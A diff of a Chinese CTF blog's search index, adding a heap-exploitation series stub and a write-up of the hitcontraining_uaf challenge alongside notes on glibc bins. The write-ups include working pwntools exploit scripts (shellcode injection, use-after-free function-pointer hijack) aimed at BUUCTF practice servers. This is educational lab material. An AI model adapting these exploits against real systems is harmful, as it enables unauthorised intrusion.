@@ -1,6 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>house of系列</title>
+    <url>/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/</url>
+    <content><![CDATA[<p> 该系列内容较多，将会在较长时间持续更新</p>
+<h2 id="house-of-Roman"><a href="#house-of-Roman" class="headerlink" title="house of Roman"></a>house of Roman</h2><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2>]]></content>
+      <tags>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>offbyone&amp;null</title>
     <url>/2021/07/20/2021-07-26-offbyone-null/</url>
     <content><![CDATA[<h1 id="offbyone"><a href="#offbyone" class="headerlink" title="offbyone"></a>offbyone</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>正常来说，我们希望程序的堆溢出能够溢出到next chunk的fd或者bk字段，进而完成利用。但是这样的情况是很少的，因而需要一种更加常见的特殊的堆溢出形式——offbyone，溢出字节就如他的名字一样，只能溢出一个字节。实际生活中这种漏洞很常见，程序员很容易犯这种错误，一般是因为边界检查不严格等情况。</p>
@@ -64,7 +73,7 @@
   <entry>
     <title>bin链情况集合</title>
     <url>/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/</url>
-    <content><![CDATA[<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/image-20210720154252123.png"><span class="image-caption">image-20210720154252123</span></p>
+    <content><![CDATA[<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/image-20210720154252123-1627363406388.png"><span class="image-caption">image-20210720154252123</span></p>
 <h1 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h1><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><ul>
 <li><p>大小范围：0x20 - 0x80</p>
 </li>
@@ -73,7 +82,7 @@
 <li><p>FILO（最后一个进入fastbin链表的，会被放在头部）<br>总共有十个fastbin链表，每个链表中fastbin的size一样，0x10递增<br>大小属于fastbin的chunk被free掉时，不会改变nextchunk的previnuse位，也就是说不会被合并。</p>
 </li>
 </ul>
-<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/image-20210720154343954.png"><span class="image-caption">image-20210720154343954</span></p>
+<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/image-20210720154343954-1627363410633.png"><span class="image-caption">image-20210720154343954</span></p>
 <h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><ul>
 <li>被释放的堆块的fd指针不能指向自己（这也就是想要double free的时候，还需要一个中间chunk的原因）</li>
 <li>将fastbin里面的chunk分配出去时，会检查size位会不会匹配chunk的大小，会才能分配</li>
@@ -111,7 +120,7 @@
 </ul>
 <h1 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h1><h3 id="基本结构-3"><a href="#基本结构-3" class="headerlink" title="基本结构"></a>基本结构</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/image-20210720153655147.png" style="zoom:80%;"><span class="image-caption">image-20210720153655147</span>
 
-<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/image-20210726103541056.png"><span class="image-caption">image-20210726103541056</span></p>
+<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/image-20210726103541056-1627363427270.png"><span class="image-caption">image-20210726103541056</span></p>
 <ul>
 <li><p>大小范围：0x410 以上</p>
 </li>
@@ -186,28 +195,6 @@
   </entry>
   <entry>
     <title>buu06</title>
-    <url>/2021/06/05/buu06/</url>
-    <content><![CDATA[<h3 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h3><p>常规checksec一下，看看保护</p>
-<p><img src="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210605121040.png"></p>
-<p>只开启了NX</p>
-<p>进入ida看看代码</p>
-<p><img src="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210605121308.png"></p>
-<p>第一个功能很神奇的让我们输入一个长度为0x10的数据，然后用system调用？我跑去nc了一下</p>
-<p><img src="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210605121007.png"></p>
-<p>好吧，成功获得flag了。</p>
-<h3 id="picoctf-2018-shellcode"><a href="#picoctf-2018-shellcode" class="headerlink" title="picoctf_2018_shellcode"></a>picoctf_2018_shellcode</h3><p>checksec一下<img src="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210614103954.png"></p>
-<p>保护都没开启，拖入ida分析一下。无法F5反汇编，只能看汇编代码了。</p>
-<p><img src="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210614104047.png"></p>
-<p><img src="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210614104037.png"></p>
-<p>有个vuln函数，里面有调用gets和puts两个函数，可以进行输入。再看其他代码，底下有个call eax，可以进行执行代码，看下eax的内容来自哪里</p>
-<p><img src="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210614104610.png"></p>
-<p>这里传递给eax的地址与下面调用时一致，然后vuln函数里面gets输入的地址是ebp+8中存放的地址，其实就是eax里面的地址内容，所以整个程序总的说就是会执行我们输入进去的东西，加上nx未开，输入shellcode来getshell</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28165</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;string!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>
-
-]]></content>
-  </entry>
-  <entry>
-    <title>buu06</title>
     <url>/2021/06/05/2021-06-14-buu06/</url>
     <content><![CDATA[<h3 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h3><p>常规checksec一下，看看保护</p>
 <p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121040.png"></p>
@@ -225,6 +212,26 @@
 <p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104610.png"></p>
 <p>这里传递给eax的地址与下面调用时一致，然后vuln函数里面gets输入的地址是ebp+8中存放的地址，其实就是eax里面的地址内容，所以整个程序总的说就是会执行我们输入进去的东西，加上nx未开，输入shellcode来getshell</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28165</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;string!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h3><p>常规checksec一下</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132448387.png"><span class="image-caption">image-20210727132448387</span></p>
+<p>进入ida看看，其实题目已经有暗示，uaf，所以我们先去delete函数里面看看，</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132528641.png"><span class="image-caption">image-20210727132528641</span></p>
+<p>确实存在着uaf，那么该怎么利用？再看看add函数和printf函数</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132617843.png"><span class="image-caption">image-20210727132617843</span></p>
+<p>这边的add函数比较奇怪，首先是有次数限制只能申请五个堆块，其次是会申请两个堆块，第一个堆块是固定8字节大小，前4个字节存放一个print_note_content函数的地址，后4个字节是我们可以控制的，申请一个任意大小的堆块</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132832076.png"><span class="image-caption">image-20210727132832076</span></p>
+<p>在print函数里面，最后会进行函数调用，就是调用先前在add函数里面保存的print_note_content函数进行打印我们可以控制的堆块里面的内容</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727133015119.png"><span class="image-caption">image-20210727133015119</span></p>
+<p>最后就是还存在一个后门函数</p>
+<p>思路：一开始是觉得没有edit这类的函数，可能是要制造堆块重叠，把后门函数劫持到malloc_hook里面去，还以为5个会够，但是一个泄露libc基址，再一个申请fastchunk进行double free，然后还需要申请四次，超过次数了</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727135534549.png"><span class="image-caption">image-20210727135534549</span></p>
+<p>这是double free的fastbin上的情况，因为free也是两个，所以直接进行两次操作直接就可以构造出A-B-A</p>
+<p>所以换一种方法：利用那个函数调用，想办法把进行调用的堆块变成是我们可以控制的那个堆块，把内容改成后门函数，那么就可以getshell了！</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727140624461.png"><span class="image-caption">image-20210727140624461</span></p>
+<p>像这样，我们可以控制的堆块申请一个比0x8大的堆块，那么我们就不会申请走，而固定申请大小为0x8的堆块就会申请走一个，此时我们，如果再申请0x8的堆块，就会进行更换了，我们申请到的就是之前程序的固定堆块，最后printf一下，就getshell了！</p>
+<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727141018340.png"><span class="image-caption">image-20210727141018340</span></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br><span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26333</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>shell_addr=<span class="hljs-number">0x8048945</span><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>,p32(shell_addr))<br>printf(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 ]]></content>
       <tags>
